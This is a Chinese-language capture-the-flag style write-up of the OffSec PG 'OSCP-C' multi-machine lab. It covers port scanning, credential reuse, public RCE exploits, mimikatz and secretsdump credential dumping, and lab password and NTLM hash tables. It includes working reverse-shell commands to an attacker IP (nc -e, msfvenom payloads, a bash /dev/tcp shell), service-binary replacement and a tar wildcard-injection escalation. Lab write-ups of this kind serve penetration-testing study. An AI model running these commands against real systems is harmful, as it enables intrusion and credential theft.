---
title: "OSCP-C"
description: "这篇OffSec PG Chain 多机靶场 OSCP-C 复盘串联了多台主机之间的突破顺序、凭据衔接与横向提权路径。"
summary: "这篇OffSec PG Chain 多机靶场 OSCP-C 复盘串联了多台主机之间的突破顺序、凭据衔接与横向提权路径。"
date: "2025-01-19T23:25:18+08:00"
publishDate: "2025-01-19T23:25:18+08:00"
lastmod: "2025-01-19T23:25:18+08:00"
url: "/pg/challenge-labs/oscp-c/"
image: "images/oscp-banners/banner-050.jpg"
draft: false
unfinished: false
categories:
  - "OSCP"
  - "OffSec PG"
tags:
  - "Chain"
oscp_provider: "OffSec PG"
oscp_platform: "Chain"
---
<!-- oscp-refactor:meta-start -->
> 平台：Chain / 多机 ｜ 来源：OffSec PG
<!-- oscp-refactor:meta-end -->

| 机器 | 名称            | 类型     | 值                                                           |
| ---- | --------------- | -------- | ------------------------------------------------------------ |
| MS01 | support         | password | Freedom1                                                     |
| MS01 | ecorp           | password | ecorp                                                        |
| MS01 | administrator   | password | December31                                                   |
| MS01 | DefaultPassword | password | 7k8XHk3dMtmpnC7                                              |
| MS01 | Administrator   | NTLM     | 3c4495bbd678fac8c9d218be4f2bbc7b                             |
| MS01 | Mary.Williams   | NTLM     | 9a3121977ee93af56ebd0ef4f527a35e                             |
| MS01 | MS01$           | NTLM     | eaa1d4636ebc36f6c2a4476d4be210c0/5fbc2e817c6ecb8883ba721aa80aa2fe |
| MS01 | Administrator   | password | hghgib6vHT3bVWf                                              |
| MS02 | Administrator   | NTLM     | 59b280ba707d22e3ef0aa587fc29ffe5                             |
|      | MS02$           |          | c6bd3759f3b478b7609be9d81447584f/2f1c27433355e1f2b0caeb6d1d096ff2 |
|      |                 |          |                                                              |
|      | DefaultPassword |          | 7Tg9M9MZbzAokR9                                              |

![image-20250119141158876](https://s2.loli.net/2025/01/19/m6Of5yxouGDE7Lw.png)

IP列表

| IP                | HOST | 机器类型 |
| ----------------- | ---- | -------- |
| 192.168.192.153   | MS01 | WINDOWS  |
| **10.10.152.154** | MS02 | WINDOWS  |
| **10.10.152.152** | DC01 | WINDOWS  |
|                   |      |          |
|                   |      |          |
|                   |      |          |

hosts修改记录

```
192.168.192.153 ms01.oscp.exam
10.10.152.152 dc01.oscp.exam
10.10.152.154 ms02.oscp.exam
10.10.152.152 oscp.exam
```

<!-- oscp-refactor:merged-start -->

## 关联机器记录

### 10.10.152.152 DC01

针对目标服务器进行相应的TCP全端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 10.10.152.152 --ulimit 1000
```

![image-20250119163404198](https://s2.loli.net/2025/01/19/uv9QLDXJzA4ysPI.png)

针对通过工具扫描得到的开放端口进行二次扫描，获取相应端口运行的服务信息等内容，辅助下一步的判断

```
```



```
evil-winrm -i 10.10.152.152 -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'
```

![image-20250119173349221](https://s2.loli.net/2025/01/19/Jo4EYtOj8a3LV5m.png)

成功登录且是domain admins用户

![image-20250119173443193](https://s2.loli.net/2025/01/19/mH8kpLiJxd5WEv2.png)

获取到最终的flag内容

4965210b24cad817df70cd1a4c09bbba

### 10.10.152.154 MS02

针对目标服务器进行相应的TCP全端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 10.10.152.154 --ulimit 500
```

![image-20250119162203006](https://s2.loli.net/2025/01/19/VS6dmYLDJEBzPeM.png)

针对通过工具扫描得到的开放端口进行二次扫描，获取相应端口运行的服务信息等内容，辅助下一步的判断

```
sudo nmap -p135,139,445,1433,5040,5985 -A -Pn 10.10.152.154 -oN 10.10.152.154_MS02.txt
```

![image-20250119164716412](https://s2.loli.net/2025/01/19/XDIGOHfoz7VyA4i.png)

针对1433端口进行了ms01获取的登录凭证尝试，均失败

![image-20250119163011434](https://s2.loli.net/2025/01/19/EZr1PHcdaWsn5XL.png)

经过各种尝试后，我们发现一组可用的密码组合

```
evil-winrm -i 10.10.152.154 -u 'Administrator' -p 'hghgib6vHT3bVWf'
```

![image-20250119170501793](https://s2.loli.net/2025/01/19/xbwqO1elpIBT7zL.png)

我们成功登录了

![image-20250119170946524](https://s2.loli.net/2025/01/19/Iz76TRHtQaynboN.png)

![image-20250119171103065](https://s2.loli.net/2025/01/19/QFLCzye3dpulNEs.png)

我们看到了一个sam和system文件，我们进行下载，在本地进行相应的分析

```
impacket-secretsdump -sam "SAM" -system "SYSTEM" LOCAL
```

![image-20250119172916043](https://s2.loli.net/2025/01/19/d7g9iKVYtajkQrx.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```

```
#攻击端进行侦听端口增加，让MS02能够访问到攻击端
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888
ssh administrator@192.168.192.153 -R '*:8888:127.0.0.1:8888'
iwr http://10.10.152.153:8888/nc.exe -outfile nc.exe
iwr http://10.10.152.153:8888/mimikatz.exe -outfile mimikatz.exe

.\nc.exe 10.10.152.153 8888 -e cmd
.\mimikatz.exe

```

![image-20250119172903264](https://s2.loli.net/2025/01/19/uZaGg2m6eIj9KMR.png)

### 192.168.192.153 MS01

针对目标服务器进行相应的TCP全端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 192.168.192.153 --ulimit 1000
```

![image-20250119142620188](https://s2.loli.net/2025/01/19/gzOmZpLR579eAij.png)

针对通过工具扫描得到的开放端口进行二次扫描，获取相应端口运行的服务信息等内容，辅助下一步的判断

```
sudo nmap -p22,135,139,445,5040,5985,8000,47001,49664,49665,49666,49667,49668,49669,49670,49671 -A -Pn 192.168.192.153 -oX 192.168.192.153_MS01.txt
```

![image-20250119143135058](https://s2.loli.net/2025/01/19/wLi3sOB1oJq7u5m.png)

针对目标服务器的UDP端口进行全探测

```
sudo nmap -sU -Pn --min-rate 2000 192.168.192.153
```

![image-20250119143233854](https://s2.loli.net/2025/01/19/IdJcWsFgp7nVkGi.png)

针对smb服务进行匿名访客访问探测

```
netexec smb 192.168.192.153 -u guest -p '' --shares
```

![image-20250119143035929](https://s2.loli.net/2025/01/19/vAOfE3cpD1Wywmq.png)

针对8000端口的http服务进行扫描探测

```
dirsearch -u http://192.168.192.153:8000/ 
```

![image-20250119143326431](https://s2.loli.net/2025/01/19/vhS6XUMsPbl4yFx.png)

添加相应的hosts记录内容

```
dirsearch -u http://ms01.oscp.exam:8000/ -w /usr/share/wordlists/dirb/big.txt -f -e aspx,php,html,txt
```

![image-20250119145142097](https://s2.loli.net/2025/01/19/i2HDphmbko48dSy.png)

```
dirsearch -u http://ms01.oscp.exam:8000/partner/
```

![image-20250119145820645](https://s2.loli.net/2025/01/19/iBToxf1Kjz6rL39.png)

我们访问changelog和db两个目录，发现是两个文件我们进行下载

![image-20250119145854715](https://s2.loli.net/2025/01/19/Il4xr952vwTSDXA.png)

```
sqlite3 db
```

![image-20250119145909447](https://s2.loli.net/2025/01/19/V4Zb3qnrFe9fzIY.png)

我们获取了几个用户名和密码或者密码哈希

![image-20250119150010489](https://s2.loli.net/2025/01/19/AmGYMSu8IiTf1Jp.png)

尝试发现是普通的MD5

```
1|ecorp|7007296521223107d3445ea0db5a04f9|-
2|support|26231162520c611ccabfb18b5ae4dff2|support account for internal use
3|bcorp|e7966b31d1cad8a83f12ecec236c384c|-
4|acorp|df5fb539ff32f7fde5f3c05d8c8c1a6e|-
```

只有前两个能破解hash，我们尝试根据获得的密码，针对winrm，ssh和smb服务进行相应的探测

```
ssh support@192.168.192.153 
```

support是能直接登录的，ecorp无法登录，针对smb和winrm服务两者都无法登录，我们进行ssh登录，进行下一步查探

![image-20250119151247304](https://s2.loli.net/2025/01/19/2NwFIqv7DdH4CjV.png)

![image-20250119151257176](https://s2.loli.net/2025/01/19/6k3b8HsnyOf12Qr.png)

![image-20250119150859267](https://s2.loli.net/2025/01/19/YaOjTAqtHzmK3py.png)

有一个叫admintool.exe的工具，我们下载进行下分析

```
scp support@192.168.192.153:c:/Users/support/admintool.exe .
```

使用dnspy没有什么发现，我们运行下

![image-20250119155804944](https://s2.loli.net/2025/01/19/iWFoa2JseCAPu4w.png)

![image-20250119155813514](https://s2.loli.net/2025/01/19/b1IsRoWCqwTAJD5.png)

需要我们输入密码，报错信息，需要left==right，我们尝试复制hash进行破解

left: d41d8cd98f00b204e9800998ecf8427e

right: 05f8ba9f047f799adbea95a16de2ef5d（ December31）



![image-20250119155857717](https://s2.loli.net/2025/01/19/BkFzTXCc1ZylRuO.png)

我们尝试输入这个密码

![image-20250119155946233](https://s2.loli.net/2025/01/19/bVj2GtaATS87g5c.png)

貌似成功了，这个密码可能就是administrator的密码，或者只是这个应用的密码，我们尝试使用下ssh

![image-20250119160055460](https://s2.loli.net/2025/01/19/gCOrJYykbm17wXe.png)

我们成功完成了登录，我们上传mimikatz进行分析

```
iwr http://192.168.45.206/mimikatz.exe -outfile mimikatz.exe
.\mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
lsadump::lsa /patch
vault::cred /patch
lsadump::cache
lsadump::secrets

```

![image-20250119160935429](https://s2.loli.net/2025/01/19/wQtdJVDouMaFcK7.png)



我们在服务器上看到web_svc的用户，我们尝试伤处rubeus，看看是否存在信息

```
iwr http://192.168.45.206/Rubeus.exe -outfile Rubeus.exe
```

但没有什么发现，我们假设条隧道，优先查看下内网的端口服务情况

```
iwr http://192.168.45.206/agent.exe -outfile agent.exe
.\agent.exe -connect 192.168.45.206:11601 -ignore-cert
sudo ip route add 10.10.152.0/24 dev ligolo
tunnel_start
```

![image-20250119170001041](https://s2.loli.net/2025/01/19/Aw8gprakJTqUoYF.png)

我们又在历史文件中找到一个密码

### 192.168.192.155 Pascha

针对目标服务器进行相应的TCP全端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 192.168.192.155 --ulimit 500
```

![image-20250119173555524](https://s2.loli.net/2025/01/19/67ntKLsbYJWGwNF.png)

针对通过工具扫描得到的开放端口进行二次扫描，获取相应端口运行的服务信息等内容，辅助下一步的判断

```
sudo nmap -p80,9099,9999,35913 -A -Pn 192.168.192.155 -oN 192.168.192.155_Pascha.txt
```

![image-20250119205315571](https://s2.loli.net/2025/01/19/qOGJH5gsd7trR6u.png)

```
dirsearch -u http://192.168.192.155
```

![image-20250119210153037](https://s2.loli.net/2025/01/19/QGbBUiAwL9rdDZ3.png)



9099端口

![image-20250119210041614](https://s2.loli.net/2025/01/19/Gy4rj2fVs6nF1ae.png)

我们看nmap的扫描结果，该服务貌似是一个Mobile Mouse Server，我们进行Google搜索，发现存在一个RCE漏洞，我们可以进行尝试，看看是否能够使用

https://github.com/lof1sec/mobile_mouse_rce

修改下脚本中针对8080端口的使用，改成80的下载端口

```
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=192.168.45.206 LPORT=8080 -f exe -o rshell.exe
sudo python3 -m http.server 80
sudo nc -nvlp 8080 
python3 mobile_mouse_rce.py --target 192.168.192.155 --lhost 192.168.45.206 --file rshell.exe
```

![image-20250119211825381](https://s2.loli.net/2025/01/19/upFLRiA6o2j8wN4.png)

我们成功获取到相应的shell，并取得第一个flag内容

f0c86d4a83ca4f0c876db49a7b2f0b8f

接着我们考虑提权的相关问题

历史命令没有找到

![image-20250119212209095](https://s2.loli.net/2025/01/19/AJSF5VRop8sWKk1.png)

![image-20250119212549484](https://s2.loli.net/2025/01/19/sSwN17JjQiFotZa.png)

我们看到一个应用程序，经过Google搜索，发现一个漏洞

https://www.exploit-db.com/exploits/52061

```
powershell -command "(Get-Command .\mDNSResponder.exe).FileVersionInfo.FileVersion"
```

![image-20250119212823623](https://s2.loli.net/2025/01/19/rSZXfdwBuoN1Q8L.png)

![image-20250119213611322](https://s2.loli.net/2025/01/19/FIUi4cmCwq1NsRz.png)

我们又找到一个不常见应用，发现也存在LPE漏洞

https://www.exploit-db.com/exploits/51410

https://www.exploit-db.com/exploits/50558

结合winpeas的结果

![image-20250119214331632](https://s2.loli.net/2025/01/19/VnLEigKIRovhMXW.png)

![image-20250119214441212](https://s2.loli.net/2025/01/19/dSypwA6Lk9IJEqW.png)

![image-20250119215004911](https://s2.loli.net/2025/01/19/RymzrhBd4QbL7PT.png)

我们尝试替换MilleGPG5.exe

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.206 LPORT=443 -f exe > MilleGPG5-evil.exe
rename-item MilleGPG5.exe MilleGPG5.exe.bak
rename-item MilleGPG5-evil.exe MilleGPG5.exe
sc stop MilleGPG5
sc start MilleGPG5
```

![image-20250119221314146](https://s2.loli.net/2025/01/19/lApBEHMx8hziTs3.png)

我们尝试替换GPGService.exe

```
iwr http://192.168.45.206/GPGService_evil.exe -outfile GPGService_evil.exe
rename-item GPGService.exe GPGService.exe.bak
rename-item GPGService_evil.exe GPGService.exe
Restart-service GPGOrchestrator
```

![image-20250119222048301](https://s2.loli.net/2025/01/19/ELubsrCWBOgQazG.png)

成功获取相应的权限，并取得flag内容

bb97ee7909533b47f161701885b35934

### 192.168.192.156 Frankfurt

针对目标服务器进行相应的TCP全端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 192.168.192.156 --ulimit 500 
```

![image-20250119144338441](https://s2.loli.net/2025/01/19/cVqGN5bDg926oFT.png)

针对通过工具扫描得到的开放端口进行二次扫描，获取相应端口运行的服务信息等内容，辅助下一步的判断

```
sudo nmap -p21,22,25,53,80,110,143,465,597,993,995,2525,3306,8080,8083,8443 -A -Pn 192.168.192.156 -oN 192.168.192.156_Frankfurt.txt
```

![image-20250119222427516](https://s2.loli.net/2025/01/19/WUNo59RcY7J1ChD.png)

21端口尝试使用ftp和匿名登录均没有结果

80端口的服务

VESTA

![image-20250119222623257](https://s2.loli.net/2025/01/19/jsWXLn3dtrKvU4b.png)

经过搜索发现存在一个认证状态的RCE漏洞

该服务器具有众多的邮件服务端口，我们尝试登录邮箱，查看是否又什么能够获取的内容

8083存在登录端口

![image-20250119223157681](https://s2.loli.net/2025/01/19/wkgaybcQI63rPue.png)

![image-20250119223206175](https://s2.loli.net/2025/01/19/JcgRUwHxBEondz2.png)

我们尝试使用默认的账号密码登录失败

```
dirsearch -u http://192.168.192.156/
```

![image-20250119224222859](https://s2.loli.net/2025/01/19/hSE98rtL3vJXw2i.png)

phpmyadmin使用root/root的默认账号密码没有登录

![image-20250119224407417](https://s2.loli.net/2025/01/19/pFX2dIhEra7TqZP.png)

```
dirsearch -u https://192.168.192.156:8083/api/v1/
```

![image-20250119225819843](https://s2.loli.net/2025/01/19/Db8fKzCO62uLodB.png)

![image-20250119225854784](https://s2.loli.net/2025/01/19/o183p9rDVv7aMtg.png)

没有其他的发现，我们现在只需要一个账号密码，就有可能利用漏洞或者访问邮件系统

```
sudo nmap -sU -Pn --min-rate 1000 192.168.192.156
```

![image-20250119230353919](https://s2.loli.net/2025/01/19/NfArXbahkEu8ctI.png)

我们看到snmp端口开放，我们尝试在其中获取相应的信息

```
snmpwalk -v2c -c public 192.168.192.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

![image-20250119230454138](https://s2.loli.net/2025/01/19/NWD8p6QRvch2Ob7.png)

我们找到了一组账号密码

| username | password         |
| -------- | ---------------- |
| jack     | 3PUKsX98BMupBiCf |

我们尝试了ftp，ssh，mysql，8443登录端口，110端口等密码均不正确，80上的邮箱服务也不正确

我们尝试利用漏洞

通过Google搜素关键字：vesta rce exploit github

我们发现了一个项目

https://github.com/rekter0/exploits/tree/master/VestaCP

```
python3 -m venv .venv
.venv/bin/python -m pip install -r requirements.txt
.venv/bin/python -m pip install requests
.venv/bin/python vestaROOT.py https://192.168.192.156:8083 Jack 3PUKsX98BMupBiCf
```

一开始还是登录问题，最后发现jack的J需要大写就可以进行登录

![image-20250119232205056](https://s2.loli.net/2025/01/19/a2CzMq1QephcnBV.png)

获取两个flag内容

556cc92f1a9d3f5b513362997503edb0

084ccc0631580b0122097d0411b11019

### 192.168.192.157 Charlie

针对目标服务器进行相应的TCP全端口探测

```
/home/zkpc/.cargo/bin/rustscan -a 192.168.192.157 --ulimit 500
```

![image-20250119144411700](https://s2.loli.net/2025/01/19/mVX7hIJZe13qGU4.png)

针对通过工具扫描得到的开放端口进行二次扫描，获取相应端口运行的服务信息等内容，辅助下一步的判断

```
sudo nmap -p21,22,80 -A -Pn 192.168.192.157 -oN 192.168.192.157_Charlie.txt
```

![image-20250119174001945](https://s2.loli.net/2025/01/19/baomwtVr6DdNiSn.png)

```
sudo nmap -sU -Pn --min-rate 1000 192.168.192.157
```

![image-20250119175329789](https://s2.loli.net/2025/01/19/FBH34SOQuY8PVA2.png)

```
ftp 192.168.192.157 21
ftp/ftp
passive
mget *
```

ftp发现一个backup文件夹，我们进行下载后查看

![image-20250119174400092](https://s2.loli.net/2025/01/19/D4nHTLXwRtiWYzB.png)

经过查看文件内容没有什么特别之处，我们针对文件信息进行检查

```
exiftool -a -u *.pdf
```

![image-20250119174757362](https://s2.loli.net/2025/01/19/cgqzaiF8VHCAG4o.png)

```
exiftool -a -u *.pdf | grep Author
```

![image-20250119174829816](https://s2.loli.net/2025/01/19/pRWPVMk7muyY3T5.png)

我们发现了三个用户名

```
Cassie
Mark
Robert
```

我们使用这三个和用户名相同的名称进行ftp的登录

```
ftp 192.168.192.157 21
```

![image-20250119175559569](https://s2.loli.net/2025/01/19/2sg5d8tjQC6AubL.png)

结果发现cassie/cassie可以登录，同时我们获取了local.txt

![image-20250119175706671](https://s2.loli.net/2025/01/19/rc6LWBSGaZu87Fv.png)

既然存在.ssh，但里面没有私钥，我们可以本地生成后进行上传

![image-20250119175811616](https://s2.loli.net/2025/01/19/kVITebtnLGypvC2.png)

![image-20250119180304018](https://s2.loli.net/2025/01/19/8AsU5RKCZ6XdjTw.png)

但存在权限问题



我们开启一个针对80端口的路径扫描

```
dirsearch -u http://192.168.192.157 
```

![image-20250119175750313](https://s2.loli.net/2025/01/19/GqoTDa2crL4guJz.png)

同时针对ssh端口使用上述的用户名进行爆破

```
hydra -L users.txt -P users.txt ssh://192.168.192.157 -vV
```

失败没有结果

到这一步我们进行不下去了，再次尝试扫描端口，发现一个20000端口

![image-20250119181459968](https://s2.loli.net/2025/01/19/vtAb4ayzgrSIjqY.png)

```
sudo nmap -p21,22,80,20000 -A -Pn 192.168.192.157 -oN 192.168.192.157_Charlie.txt
```

![image-20250119181552645](https://s2.loli.net/2025/01/19/Z5iMqxYvzLjePI7.png)

针对20000端口的服务进行搜索，查看是否有可以利用的漏洞，结果发现存在RCE

https://www.exploit-db.com/exploits/50234

我们进行利用，这个漏洞需要进行认证，我们之前获取了一对账号密码，我们在这里使用

```
sudo python3 50234.py -u 192.168.192.157 -l cassie -p cassie
```

我们针对脚本进行修改，例如侦听端口等

![image-20250119183545637](https://s2.loli.net/2025/01/19/IAdnWcXEyOu6gpF.png)

反复非常多次之后终于成功

![image-20250119191137332](https://s2.loli.net/2025/01/19/OvCYeMxt5nfFm26.png)

![image-20250119191312003](https://s2.loli.net/2025/01/19/kFXwWIhJQ2plOAD.png)

![image-20250119191342333](https://s2.loli.net/2025/01/19/16KiOv2TwflCLAs.png)

我们上传linpeas进行提权

![image-20250119192045781](https://s2.loli.net/2025/01/19/IzYhQmijOCrf36s.png)

![image-20250119192240008](https://s2.loli.net/2025/01/19/uc4UFT7QZLWboYr.png)

我们再上传pspy，运行查看后台是否存在任务

![image-20250119192630314](https://s2.loli.net/2025/01/19/mvsfNqL16XdPABw.png)

tar命令不是绝对路径，我们进行修改

```
export PATH=/tmp:$PATH
echo $PATH

vi tar 

#!/bin/bash
cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
```

再次等待定时任务

但该方法没有成功，我们看到最后是通配符，我们尝试使用tar的sudo提权方式

https://medium.com/@silver-garcia/how-to-abuse-tar-wildcards-for-privilege-escalation-tar-wildcard-injection-612a6eac0807

我找到了这个文章

```
vi root-shell.sh
#!/bin/bash
/bin/sh -i >& /dev/tcp/192.168.45.206/80 0>&1
```

```
echo '' > '--checkpoint-action=exec=/bin/sh'
--checkpoint-action=exec=sh root-shell.sh

echo '' |  tee '/opt/admin/--checkpoint-action=exec=sh root-shell.sh' > /dev/null
echo '' |  tee '/opt/admin/--checkpoint-action=exec=/bin/sh' > /dev/null
```

![image-20250119202050536](https://s2.loli.net/2025/01/19/c5uzR8CvBnQXdEl.png)

d2ec23e15f85668bd2b33b457fbff1aa

成功获得第二个flag

<!-- oscp-refactor:merged-end -->
